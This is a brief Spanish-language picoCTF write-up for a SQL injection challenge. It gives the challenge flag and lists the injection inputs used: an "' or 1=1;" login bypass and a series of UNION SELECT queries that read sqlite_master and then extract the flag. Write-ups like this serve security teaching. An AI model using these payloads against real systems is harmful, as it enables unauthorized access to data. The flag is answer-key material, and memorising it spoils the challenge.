## **Descripcion**
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:63148/).
## **Solucion**
Solo se utilizo estar en la pagina proporcionada por pico
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}


## **Notas adicionales**
cuando se ingresa a la pagina sale para ingresar tendras que usar como datos de usuario y contraseña estos
' or 1=1; ' or 1=1;
Finalmente que entraste  en el apartado de busqueda se ingresada estos comandos uno a uno
ciudad' union select 1,2,3;
ciudad' union select sqlite_version(),2,3;
ciudad' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' ;
ciudad' union select 1,sql,tbl_name FROM sqlite_master WHERE type='table' ;
ciudad' union select 1,2,flag from more_table;
en la parte de ultimo te saldra dos apartados uno con un texto y el otro ahi estara la bandera

se uso uso de guia la pagina de SQLite injection.
## **Referencias**
- SQLite Injection: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md")
- picoCTF 2023 writeup [63] - Web Explotation - More SQLi https://www.youtube.com/watch?v=clMe4yqL6yU&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=63